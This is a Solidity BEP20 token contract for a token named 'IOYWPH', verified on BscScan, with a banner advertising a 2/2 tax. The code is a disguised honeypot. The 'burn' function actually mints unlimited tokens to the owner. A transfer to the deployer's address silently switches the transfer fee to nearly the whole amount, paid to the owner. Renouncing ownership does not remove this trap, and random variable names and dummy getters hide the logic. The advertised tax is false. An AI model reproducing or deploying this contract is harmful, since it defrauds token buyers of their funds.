/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
/*

 ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗ 
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗
██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║
██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║
╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝
 ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝ 
                       
            Telegram:https://t.me/Crypto_HelloWorld
            Tax     :2/2


*/
pragma solidity >=0.6.0;
contract CYHDODN {
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  FWNULD = 10000000000000;
uint256 private  XWKSYZ = 1000000000000000000;
mapping (address => uint256) public balanceOf;
address public owner;
address private  YUJKQK = address(0);
address private  IGNKRS = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  LVYCMW = 1000000000000000;
uint256 private  ARZKVE = 100000000;
address private  RUUSHE = address(0);
uint256 private  RJRLMY = 1000000000000000000000;
uint256 private  ZCGEZW = 1000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public constant SKVTAM = 99999;
uint256 private  DHSXTI = 10000000000;
string public  name = "IOYWPH";
address private  UKAERW = address(0);
string public  symbol = "IOYWPH";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  IUDXND = address(0);
uint8 public constant decimals = 18;
function _getFWNULD() private returns (uint256) {
return FWNULD;
}

function _getYUJKQK() private returns (address) {
return YUJKQK;
}

function _getDHSXTI() private returns (uint256) {
return DHSXTI;
}

function _getARZKVE() private returns (uint256) {
return ARZKVE;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
UKAERW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getLVYCMW() private returns (uint256) {
return LVYCMW;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FRIBYQ");
require(to != address(0), "FRIBYQ");
require(amount <= balanceOf[from], "FRIBYQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* SKVTAM/ZCGEZW ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==UKAERW){
ZCGEZW = SKVTAM+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getIUDXND() private returns (address) {
return IUDXND;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFRIBYQ 0");
require(spender != address(0), "fFRIBYQ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getIGNKRS() private returns (address) {
return IGNKRS;
}

function _getRUUSHE() private returns (address) {
return RUUSHE;
}

function _getXWKSYZ() private returns (uint256) {
return XWKSYZ;
}

function _getRJRLMY() private returns (uint256) {
return RJRLMY;
}


}